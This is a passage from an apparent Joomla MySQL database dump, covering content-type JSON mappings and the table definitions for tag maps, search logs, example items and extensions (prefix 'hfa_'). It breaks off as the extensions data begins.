\"displayLookup\":[{\"sourceColumn\":\"catid\",\"targetTable\":\"#__categories\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"},{\"sourceColumn\":\"created_by\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"access\",\"targetTable\":\"#__viewlevels\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"},{\"sourceColumn\":\"modified_by\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"} ]}'),(3,'Contact','com_contact.contact','{\"special\":{\"dbtable\":\"#__contact_details\",\"key\":\"id\",\"type\":\"Contact\",\"prefix\":\"ContactTable\",\"config\":\"array()\"},\"common\":{\"dbtable\":\"#__ucm_content\",\"key\":\"ucm_id\",\"type\":\"Corecontent\",\"prefix\":\"JTable\",\"config\":\"array()\"}}','','{\"common\":{\"core_content_item_id\":\"id\",\"core_title\":\"name\",\"core_state\":\"published\",\"core_alias\":\"alias\",\"core_created_time\":\"created\",\"core_modified_time\":\"modified\",\"core_body\":\"address\", \"core_hits\":\"hits\",\"core_publish_up\":\"publish_up\",\"core_publish_down\":\"publish_down\",\"core_access\":\"access\", \"core_params\":\"params\", \"core_featured\":\"featured\", \"core_metadata\":\"metadata\", \"core_language\":\"language\", \"core_images\":\"image\", \"core_urls\":\"webpage\", \"core_version\":\"version\", \"core_ordering\":\"ordering\", \"core_metakey\":\"metakey\", \"core_metadesc\":\"metadesc\", \"core_catid\":\"catid\", \"core_xreference\":\"xreference\", \"asset_id\":\"null\"}, \"special\": {\"con_position\":\"con_position\",\"suburb\":\"suburb\",\"state\":\"state\",\"country\":\"country\",\"postcode\":\"postcode\",\"telephone\":\"telephone\",\"fax\":\"fax\",\"misc\":\"misc\",\"email_to\":\"email_to\",\"default_con\":\"default_con\",\"user_id\":\"user_id\",\"mobile\":\"mobile\",\"sortname1\":\"sortname1\",\"sortname2\":\"sortname2\",\"sortname3\":\"sortname3\"}}','ContactHelperRoute::getContactRoute','{\"formFile\":\"administrator\\/components\\/com_contact\\/models\\/forms\\/contact.xml\",\"hideFields\":[\"default_con\",\"checked_out\",\"checked_out_time\",\"version\",\"xreference\"],\"ignoreChanges\":[\"modified_by\", \"modified\", \"checked_out\", \"checked_out_time\", \"version\", \"hits\"],\"convertToInt\":[\"publish_up\", \"publish_down\", \"featured\", \"ordering\"], \"displayLookup\":[ {\"sourceColumn\":\"created_by\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"catid\",\"targetTable\":\"#__categories\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"},{\"sourceColumn\":\"modified_by\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"access\",\"targetTable\":\"#__viewlevels\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"},{\"sourceColumn\":\"user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"} ] }'),(4,'Newsfeed','com_newsfeeds.newsfeed','{\"special\":{\"dbtable\":\"#__newsfeeds\",\"key\":\"id\",\"type\":\"Newsfeed\",\"prefix\":\"NewsfeedsTable\",\"config\":\"array()\"},\"common\":{\"dbtable\":\"#__ucm_content\",\"key\":\"ucm_id\",\"type\":\"Corecontent\",\"prefix\":\"JTable\",\"config\":\"array()\"}}','','{\"common\":{\"core_content_item_id\":\"id\",\"core_title\":\"name\",\"core_state\":\"published\",\"core_alias\":\"alias\",\"core_created_time\":\"created\",\"core_modified_time\":\"modified\",\"core_body\":\"description\", \"core_hits\":\"hits\",\"core_publish_up\":\"publish_up\",\"core_publish_down\":\"publish_down\",\"core_access\":\"access\", \"core_params\":\"params\", \"core_featured\":\"featured\", \"core_metadata\":\"metadata\", \"core_language\":\"language\", \"core_images\":\"images\", \"core_urls\":\"link\", \"core_version\":\"version\", \"core_ordering\":\"ordering\", \"core_metakey\":\"metakey\", \"core_metadesc\":\"metadesc\", \"core_catid\":\"catid\", \"core_xreference\":\"xreference\", \"asset_id\":\"null\"}, \"special\": {\"numarticles\":\"numarticles\",\"cache_time\":\"cache_time\",\"rtl\":\"rtl\"}}','NewsfeedsHelperRoute::getNewsfeedRoute','{\"formFile\":\"administrator\\/components\\/com_newsfeeds\\/models\\/forms\\/newsfeed.xml\",\"hideFields\":[\"asset_id\",\"checked_out\",\"checked_out_time\",\"version\"],\"ignoreChanges\":[\"modified_by\", \"modified\", \"checked_out\", \"checked_out_time\", \"version\", \"hits\"],\"convertToInt\":[\"publish_up\", \"publish_down\", \"featured\", \"ordering\"],\"displayLookup\":[{\"sourceColumn\":\"catid\",\"targetTable\":\"#__categories\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"},{\"sourceColumn\":\"created_by\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"access\",\"targetTable\":\"#__viewlevels\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"},{\"sourceColumn\":\"modified_by\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"}]}'),(5,'User','com_users.user','{\"special\":{\"dbtable\":\"#__users\",\"key\":\"id\",\"type\":\"User\",\"prefix\":\"JTable\",\"config\":\"array()\"},\"common\":{\"dbtable\":\"#__ucm_content\",\"key\":\"ucm_id\",\"type\":\"Corecontent\",\"prefix\":\"JTable\",\"config\":\"array()\"}}','','{\"common\":{\"core_content_item_id\":\"id\",\"core_title\":\"name\",\"core_state\":\"null\",\"core_alias\":\"username\",\"core_created_time\":\"registerdate\",\"core_modified_time\":\"lastvisitDate\",\"core_body\":\"null\", \"core_hits\":\"null\",\"core_publish_up\":\"null\",\"core_publish_down\":\"null\",\"access\":\"null\", \"core_params\":\"params\", \"core_featured\":\"null\", \"core_metadata\":\"null\", \"core_language\":\"null\", \"core_images\":\"null\", \"core_urls\":\"null\", \"core_version\":\"null\", \"core_ordering\":\"null\", \"core_metakey\":\"null\", \"core_metadesc\":\"null\", \"core_catid\":\"null\", \"core_xreference\":\"null\", \"asset_id\":\"null\"}, \"special\": {}}','UsersHelperRoute::getUserRoute',''),(6,'Article Category','com_content.category','{\"special\":{\"dbtable\":\"#__categories\",\"key\":\"id\",\"type\":\"Category\",\"prefix\":\"JTable\",\"config\":\"array()\"},\"common\":{\"dbtable\":\"#__ucm_content\",\"key\":\"ucm_id\",\"type\":\"Corecontent\",\"prefix\":\"JTable\",\"config\":\"array()\"}}','','{\"common\":{\"core_content_item_id\":\"id\",\"core_title\":\"title\",\"core_state\":\"published\",\"core_alias\":\"alias\",\"core_created_time\":\"created_time\",\"core_modified_time\":\"modified_time\",\"core_body\":\"description\", \"core_hits\":\"hits\",\"core_publish_up\":\"null\",\"core_publish_down\":\"null\",\"core_access\":\"access\", \"core_params\":\"params\", \"core_featured\":\"null\", \"core_metadata\":\"metadata\", \"core_language\":\"language\", \"core_images\":\"null\", \"core_urls\":\"null\", \"core_version\":\"version\", \"core_ordering\":\"null\", \"core_metakey\":\"metakey\", \"core_metadesc\":\"metadesc\", \"core_catid\":\"parent_id\", \"core_xreference\":\"null\", \"asset_id\":\"asset_id\"}, \"special\": {\"parent_id\":\"parent_id\",\"lft\":\"lft\",\"rgt\":\"rgt\",\"level\":\"level\",\"path\":\"path\",\"extension\":\"extension\",\"note\":\"note\"}}','ContentHelperRoute::getCategoryRoute','{\"formFile\":\"administrator\\/components\\/com_categories\\/models\\/forms\\/category.xml\", \"hideFields\":[\"asset_id\",\"checked_out\",\"checked_out_time\",\"version\",\"lft\",\"rgt\",\"level\",\"path\",\"extension\"], \"ignoreChanges\":[\"modified_user_id\", \"modified_time\", \"checked_out\", \"checked_out_time\", \"version\", \"hits\", \"path\"],\"convertToInt\":[\"publish_up\", \"publish_down\"], \"displayLookup\":[{\"sourceColumn\":\"created_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"access\",\"targetTable\":\"#__viewlevels\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"},{\"sourceColumn\":\"modified_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"parent_id\",\"targetTable\":\"#__categories\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"}]}'),(7,'Contact Category','com_contact.category','{\"special\":{\"dbtable\":\"#__categories\",\"key\":\"id\",\"type\":\"Category\",\"prefix\":\"JTable\",\"config\":\"array()\"},\"common\":{\"dbtable\":\"#__ucm_content\",\"key\":\"ucm_id\",\"type\":\"Corecontent\",\"prefix\":\"JTable\",\"config\":\"array()\"}}','','{\"common\":{\"core_content_item_id\":\"id\",\"core_title\":\"title\",\"core_state\":\"published\",\"core_alias\":\"alias\",\"core_created_time\":\"created_time\",\"core_modified_time\":\"modified_time\",\"core_body\":\"description\", \"core_hits\":\"hits\",\"core_publish_up\":\"null\",\"core_publish_down\":\"null\",\"core_access\":\"access\", \"core_params\":\"params\", \"core_featured\":\"null\", \"core_metadata\":\"metadata\", \"core_language\":\"language\", \"core_images\":\"null\", \"core_urls\":\"null\", \"core_version\":\"version\", \"core_ordering\":\"null\", \"core_metakey\":\"metakey\", \"core_metadesc\":\"metadesc\", \"core_catid\":\"parent_id\", \"core_xreference\":\"null\", \"asset_id\":\"asset_id\"}, \"special\": {\"parent_id\":\"parent_id\",\"lft\":\"lft\",\"rgt\":\"rgt\",\"level\":\"level\",\"path\":\"path\",\"extension\":\"extension\",\"note\":\"note\"}}','ContactHelperRoute::getCategoryRoute','{\"formFile\":\"administrator\\/components\\/com_categories\\/models\\/forms\\/category.xml\", \"hideFields\":[\"asset_id\",\"checked_out\",\"checked_out_time\",\"version\",\"lft\",\"rgt\",\"level\",\"path\",\"extension\"], \"ignoreChanges\":[\"modified_user_id\", \"modified_time\", \"checked_out\", \"checked_out_time\", \"version\", \"hits\", \"path\"],\"convertToInt\":[\"publish_up\", \"publish_down\"], \"displayLookup\":[{\"sourceColumn\":\"created_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"access\",\"targetTable\":\"#__viewlevels\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"},{\"sourceColumn\":\"modified_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"parent_id\",\"targetTable\":\"#__categories\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"}]}'),(8,'Newsfeeds Category','com_newsfeeds.category','{\"special\":{\"dbtable\":\"#__categories\",\"key\":\"id\",\"type\":\"Category\",\"prefix\":\"JTable\",\"config\":\"array()\"},\"common\":{\"dbtable\":\"#__ucm_content\",\"key\":\"ucm_id\",\"type\":\"Corecontent\",\"prefix\":\"JTable\",\"config\":\"array()\"}}','','{\"common\":{\"core_content_item_id\":\"id\",\"core_title\":\"title\",\"core_state\":\"published\",\"core_alias\":\"alias\",\"core_created_time\":\"created_time\",\"core_modified_time\":\"modified_time\",\"core_body\":\"description\", \"core_hits\":\"hits\",\"core_publish_up\":\"null\",\"core_publish_down\":\"null\",\"core_access\":\"access\", \"core_params\":\"params\", \"core_featured\":\"null\", \"core_metadata\":\"metadata\", \"core_language\":\"language\", \"core_images\":\"null\", \"core_urls\":\"null\", \"core_version\":\"version\", \"core_ordering\":\"null\", \"core_metakey\":\"metakey\", \"core_metadesc\":\"metadesc\", \"core_catid\":\"parent_id\", \"core_xreference\":\"null\", \"asset_id\":\"asset_id\"}, \"special\": {\"parent_id\":\"parent_id\",\"lft\":\"lft\",\"rgt\":\"rgt\",\"level\":\"level\",\"path\":\"path\",\"extension\":\"extension\",\"note\":\"note\"}}','NewsfeedsHelperRoute::getCategoryRoute','{\"formFile\":\"administrator\\/components\\/com_categories\\/models\\/forms\\/category.xml\", \"hideFields\":[\"asset_id\",\"checked_out\",\"checked_out_time\",\"version\",\"lft\",\"rgt\",\"level\",\"path\",\"extension\"], \"ignoreChanges\":[\"modified_user_id\", \"modified_time\", \"checked_out\", \"checked_out_time\", \"version\", \"hits\", \"path\"],\"convertToInt\":[\"publish_up\", \"publish_down\"], \"displayLookup\":[{\"sourceColumn\":\"created_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"access\",\"targetTable\":\"#__viewlevels\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"},{\"sourceColumn\":\"modified_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"parent_id\",\"targetTable\":\"#__categories\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"}]}'),(9,'Weblinks Category','com_weblinks.category','{\"special\":{\"dbtable\":\"#__categories\",\"key\":\"id\",\"type\":\"Category\",\"prefix\":\"JTable\",\"config\":\"array()\"},\"common\":{\"dbtable\":\"#__ucm_content\",\"key\":\"ucm_id\",\"type\":\"Corecontent\",\"prefix\":\"JTable\",\"config\":\"array()\"}}','','{\"common\":{\"core_content_item_id\":\"id\",\"core_title\":\"title\",\"core_state\":\"published\",\"core_alias\":\"alias\",\"core_created_time\":\"created_time\",\"core_modified_time\":\"modified_time\",\"core_body\":\"description\", \"core_hits\":\"hits\",\"core_publish_up\":\"null\",\"core_publish_down\":\"null\",\"core_access\":\"access\", \"core_params\":\"params\", \"core_featured\":\"null\", \"core_metadata\":\"metadata\", \"core_language\":\"language\", \"core_images\":\"null\", \"core_urls\":\"null\", \"core_version\":\"version\", \"core_ordering\":\"null\", \"core_metakey\":\"metakey\", \"core_metadesc\":\"metadesc\", \"core_catid\":\"parent_id\", \"core_xreference\":\"null\", \"asset_id\":\"asset_id\"}, \"special\": {\"parent_id\":\"parent_id\",\"lft\":\"lft\",\"rgt\":\"rgt\",\"level\":\"level\",\"path\":\"path\",\"extension\":\"extension\",\"note\":\"note\"}}','WeblinksHelperRoute::getCategoryRoute','{\"formFile\":\"administrator\\/components\\/com_categories\\/models\\/forms\\/category.xml\", \"hideFields\":[\"asset_id\",\"checked_out\",\"checked_out_time\",\"version\",\"lft\",\"rgt\",\"level\",\"path\",\"extension\"], \"ignoreChanges\":[\"modified_user_id\", \"modified_time\", \"checked_out\", \"checked_out_time\", \"version\", \"hits\", \"path\"],\"convertToInt\":[\"publish_up\", \"publish_down\"], \"displayLookup\":[{\"sourceColumn\":\"created_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"access\",\"targetTable\":\"#__viewlevels\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"},{\"sourceColumn\":\"modified_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"parent_id\",\"targetTable\":\"#__categories\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"}]}'),(10,'Tag','com_tags.tag','{\"special\":{\"dbtable\":\"#__tags\",\"key\":\"tag_id\",\"type\":\"Tag\",\"prefix\":\"TagsTable\",\"config\":\"array()\"},\"common\":{\"dbtable\":\"#__ucm_content\",\"key\":\"ucm_id\",\"type\":\"Corecontent\",\"prefix\":\"JTable\",\"config\":\"array()\"}}','','{\"common\":{\"core_content_item_id\":\"id\",\"core_title\":\"title\",\"core_state\":\"published\",\"core_alias\":\"alias\",\"core_created_time\":\"created_time\",\"core_modified_time\":\"modified_time\",\"core_body\":\"description\", \"core_hits\":\"hits\",\"core_publish_up\":\"null\",\"core_publish_down\":\"null\",\"core_access\":\"access\", \"core_params\":\"params\", \"core_featured\":\"featured\", \"core_metadata\":\"metadata\", \"core_language\":\"language\", \"core_images\":\"images\", \"core_urls\":\"urls\", \"core_version\":\"version\", \"core_ordering\":\"null\", \"core_metakey\":\"metakey\", \"core_metadesc\":\"metadesc\", \"core_catid\":\"null\", \"core_xreference\":\"null\", \"asset_id\":\"null\"}, \"special\": {\"parent_id\":\"parent_id\",\"lft\":\"lft\",\"rgt\":\"rgt\",\"level\":\"level\",\"path\":\"path\"}}','TagsHelperRoute::getTagRoute','{\"formFile\":\"administrator\\/components\\/com_tags\\/models\\/forms\\/tag.xml\", \"hideFields\":[\"checked_out\",\"checked_out_time\",\"version\", \"lft\", \"rgt\", \"level\", \"path\", \"urls\", \"publish_up\", \"publish_down\"],\"ignoreChanges\":[\"modified_user_id\", \"modified_time\", \"checked_out\", \"checked_out_time\", \"version\", \"hits\", \"path\"],\"convertToInt\":[\"publish_up\", \"publish_down\"], \"displayLookup\":[{\"sourceColumn\":\"created_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"}, {\"sourceColumn\":\"access\",\"targetTable\":\"#__viewlevels\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"}, {\"sourceColumn\":\"modified_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"}]}'),(10000,'Banner','com_banners.banner','{\"special\":{\"dbtable\":\"#__banners\",\"key\":\"id\",\"type\":\"Banner\",\"prefix\":\"BannersTable\",\"config\":\"array()\"},\"common\":{\"dbtable\":\"#__ucm_content\",\"key\":\"ucm_id\",\"type\":\"Corecontent\",\"prefix\":\"JTable\",\"config\":\"array()\"}}','','{\"common\":{\"core_content_item_id\":\"id\",\"core_title\":\"name\",\"core_state\":\"published\",\"core_alias\":\"alias\",\"core_created_time\":\"created\",\"core_modified_time\":\"modified\",\"core_body\":\"description\", \"core_hits\":\"null\",\"core_publish_up\":\"publish_up\",\"core_publish_down\":\"publish_down\",\"core_access\":\"access\", \"core_params\":\"params\", \"core_featured\":\"null\", \"core_metadata\":\"metadata\", \"core_language\":\"language\", \"core_images\":\"images\", \"core_urls\":\"link\", \"core_version\":\"version\", \"core_ordering\":\"ordering\", \"core_metakey\":\"metakey\", \"core_metadesc\":\"metadesc\", \"core_catid\":\"catid\", \"core_xreference\":\"null\", \"asset_id\":\"null\"}, \"special\":{\"imptotal\":\"imptotal\", \"impmade\":\"impmade\", \"clicks\":\"clicks\", \"clickurl\":\"clickurl\", \"custombannercode\":\"custombannercode\", \"cid\":\"cid\", \"purchase_type\":\"purchase_type\", \"track_impressions\":\"track_impressions\", \"track_clicks\":\"track_clicks\"}}','','{\"formFile\":\"administrator\\/components\\/com_banners\\/models\\/forms\\/banner.xml\", \"hideFields\":[\"checked_out\",\"checked_out_time\",\"version\", \"reset\"],\"ignoreChanges\":[\"modified_by\", \"modified\", \"checked_out\", \"checked_out_time\", \"version\", \"imptotal\", \"impmade\", \"reset\"], \"convertToInt\":[\"publish_up\", \"publish_down\", \"ordering\"], \"displayLookup\":[{\"sourceColumn\":\"catid\",\"targetTable\":\"#__categories\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"}, {\"sourceColumn\":\"cid\",\"targetTable\":\"#__banner_clients\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"}, {\"sourceColumn\":\"created_by\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"modified_by\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"}]}'),(10001,'Banners Category','com_banners.category','{\"special\":{\"dbtable\":\"#__categories\",\"key\":\"id\",\"type\":\"Category\",\"prefix\":\"JTable\",\"config\":\"array()\"},\"common\":{\"dbtable\":\"#__ucm_content\",\"key\":\"ucm_id\",\"type\":\"Corecontent\",\"prefix\":\"JTable\",\"config\":\"array()\"}}','','{\"common\":{\"core_content_item_id\":\"id\",\"core_title\":\"title\",\"core_state\":\"published\",\"core_alias\":\"alias\",\"core_created_time\":\"created_time\",\"core_modified_time\":\"modified_time\",\"core_body\":\"description\", \"core_hits\":\"hits\",\"core_publish_up\":\"null\",\"core_publish_down\":\"null\",\"core_access\":\"access\", \"core_params\":\"params\", \"core_featured\":\"null\", \"core_metadata\":\"metadata\", \"core_language\":\"language\", \"core_images\":\"null\", \"core_urls\":\"null\", \"core_version\":\"version\", \"core_ordering\":\"null\", \"core_metakey\":\"metakey\", \"core_metadesc\":\"metadesc\", \"core_catid\":\"parent_id\", \"core_xreference\":\"null\", \"asset_id\":\"asset_id\"}, \"special\": {\"parent_id\":\"parent_id\",\"lft\":\"lft\",\"rgt\":\"rgt\",\"level\":\"level\",\"path\":\"path\",\"extension\":\"extension\",\"note\":\"note\"}}','','{\"formFile\":\"administrator\\/components\\/com_categories\\/models\\/forms\\/category.xml\", \"hideFields\":[\"asset_id\",\"checked_out\",\"checked_out_time\",\"version\",\"lft\",\"rgt\",\"level\",\"path\",\"extension\"], \"ignoreChanges\":[\"modified_user_id\", \"modified_time\", \"checked_out\", \"checked_out_time\", \"version\", \"hits\", \"path\"], \"convertToInt\":[\"publish_up\", \"publish_down\"], \"displayLookup\":[{\"sourceColumn\":\"created_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"access\",\"targetTable\":\"#__viewlevels\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"},{\"sourceColumn\":\"modified_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"parent_id\",\"targetTable\":\"#__categories\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"}]}'),(10002,'Banner Client','com_banners.client','{\"special\":{\"dbtable\":\"#__banner_clients\",\"key\":\"id\",\"type\":\"Client\",\"prefix\":\"BannersTable\"}}','','','','{\"formFile\":\"administrator\\/components\\/com_banners\\/models\\/forms\\/client.xml\", \"hideFields\":[\"checked_out\",\"checked_out_time\"], \"ignoreChanges\":[\"checked_out\", \"checked_out_time\"], \"convertToInt\":[], \"displayLookup\":[]}'),(10003,'User Notes','com_users.note','{\"special\":{\"dbtable\":\"#__user_notes\",\"key\":\"id\",\"type\":\"Note\",\"prefix\":\"UsersTable\"}}','','','','{\"formFile\":\"administrator\\/components\\/com_users\\/models\\/forms\\/note.xml\", \"hideFields\":[\"checked_out\",\"checked_out_time\", \"publish_up\", \"publish_down\"],\"ignoreChanges\":[\"modified_user_id\", \"modified_time\", \"checked_out\", \"checked_out_time\"], \"convertToInt\":[\"publish_up\", \"publish_down\"],\"displayLookup\":[{\"sourceColumn\":\"catid\",\"targetTable\":\"#__categories\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"}, {\"sourceColumn\":\"created_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"}, {\"sourceColumn\":\"user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"}, {\"sourceColumn\":\"modified_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"}]}'),(10004,'User Notes Category','com_users.category','{\"special\":{\"dbtable\":\"#__categories\",\"key\":\"id\",\"type\":\"Category\",\"prefix\":\"JTable\",\"config\":\"array()\"},\"common\":{\"dbtable\":\"#__ucm_content\",\"key\":\"ucm_id\",\"type\":\"Corecontent\",\"prefix\":\"JTable\",\"config\":\"array()\"}}','','{\"common\":{\"core_content_item_id\":\"id\",\"core_title\":\"title\",\"core_state\":\"published\",\"core_alias\":\"alias\",\"core_created_time\":\"created_time\",\"core_modified_time\":\"modified_time\",\"core_body\":\"description\", \"core_hits\":\"hits\",\"core_publish_up\":\"null\",\"core_publish_down\":\"null\",\"core_access\":\"access\", \"core_params\":\"params\", \"core_featured\":\"null\", \"core_metadata\":\"metadata\", \"core_language\":\"language\", \"core_images\":\"null\", \"core_urls\":\"null\", \"core_version\":\"version\", \"core_ordering\":\"null\", \"core_metakey\":\"metakey\", \"core_metadesc\":\"metadesc\", \"core_catid\":\"parent_id\", \"core_xreference\":\"null\", \"asset_id\":\"asset_id\"}, \"special\":{\"parent_id\":\"parent_id\",\"lft\":\"lft\",\"rgt\":\"rgt\",\"level\":\"level\",\"path\":\"path\",\"extension\":\"extension\",\"note\":\"note\"}}','','{\"formFile\":\"administrator\\/components\\/com_categories\\/models\\/forms\\/category.xml\", \"hideFields\":[\"checked_out\",\"checked_out_time\",\"version\",\"lft\",\"rgt\",\"level\",\"path\",\"extension\"], \"ignoreChanges\":[\"modified_user_id\", \"modified_time\", \"checked_out\", \"checked_out_time\", \"version\", \"hits\", \"path\"], \"convertToInt\":[\"publish_up\", \"publish_down\"], \"displayLookup\":[{\"sourceColumn\":\"created_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"}, {\"sourceColumn\":\"access\",\"targetTable\":\"#__viewlevels\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"},{\"sourceColumn\":\"modified_user_id\",\"targetTable\":\"#__users\",\"targetColumn\":\"id\",\"displayColumn\":\"name\"},{\"sourceColumn\":\"parent_id\",\"targetTable\":\"#__categories\",\"targetColumn\":\"id\",\"displayColumn\":\"title\"}]}');
/*!40000 ALTER TABLE `hfa_content_types` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_contentitem_tag_map`
--

DROP TABLE IF EXISTS `hfa_contentitem_tag_map`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_contentitem_tag_map` (
  `type_alias` varchar(255) NOT NULL DEFAULT '',
  `core_content_id` int(10) unsigned NOT NULL COMMENT 'PK from the core content table',
  `content_item_id` int(11) NOT NULL COMMENT 'PK from the content type table',
  `tag_id` int(10) unsigned NOT NULL COMMENT 'PK from the tag table',
  `tag_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT 'Date of most recent save for this tag-item',
  `type_id` mediumint(8) NOT NULL COMMENT 'PK from the content_type table',
  UNIQUE KEY `uc_ItemnameTagid` (`type_id`,`content_item_id`,`tag_id`),
  KEY `idx_tag_type` (`tag_id`,`type_id`),
  KEY `idx_date_id` (`tag_date`,`tag_id`),
  KEY `idx_tag` (`tag_id`),
  KEY `idx_type` (`type_id`),
  KEY `idx_core_content_id` (`core_content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='Maps items from content tables to tags';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_contentitem_tag_map`
--

LOCK TABLES `hfa_contentitem_tag_map` WRITE;
/*!40000 ALTER TABLE `hfa_contentitem_tag_map` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_contentitem_tag_map` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_core_log_searches`
--

DROP TABLE IF EXISTS `hfa_core_log_searches`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_core_log_searches` (
  `search_term` varchar(128) NOT NULL DEFAULT '',
  `hits` int(10) unsigned NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_core_log_searches`
--

LOCK TABLES `hfa_core_log_searches` WRITE;
/*!40000 ALTER TABLE `hfa_core_log_searches` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_core_log_searches` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_example_items`
--

DROP TABLE IF EXISTS `hfa_example_items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_example_items` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_example_items`
--

LOCK TABLES `hfa_example_items` WRITE;
/*!40000 ALTER TABLE `hfa_example_items` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_example_items` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_extensions`
--

DROP TABLE IF EXISTS `hfa_extensions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_extensions` (
  `extension_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `type` varchar(20) NOT NULL,
  `element` varchar(100) NOT NULL,
  `folder` varchar(100) NOT NULL,
  `client_id` tinyint(3) NOT NULL,
  `enabled` tinyint(3) NOT NULL DEFAULT '1',
  `access` int(10) unsigned NOT NULL DEFAULT '1',
  `protected` tinyint(3) NOT NULL DEFAULT '0',
  `manifest_cache` text NOT NULL,
  `params` text NOT NULL,
  `custom_data` text NOT NULL,
  `system_data` text NOT NULL,
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ordering` int(11) DEFAULT '0',
  `state` int(11) DEFAULT '0',
  PRIMARY KEY (`extension_id`),
  KEY `element_clientid` (`element`,`client_id`),
  KEY `element_folder_clientid` (`element`,`folder`,`client_id`),
  KEY `extension` (`type`,`element`,`folder`,`client_id`)
) ENGINE=InnoDB AUTO_INCREMENT=10231 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_extensions`
--

LOCK TABLES `hfa_extensions` WRITE;
/*!40000 ALTER TABLE `hfa_extensions` DISABLE KEYS */;
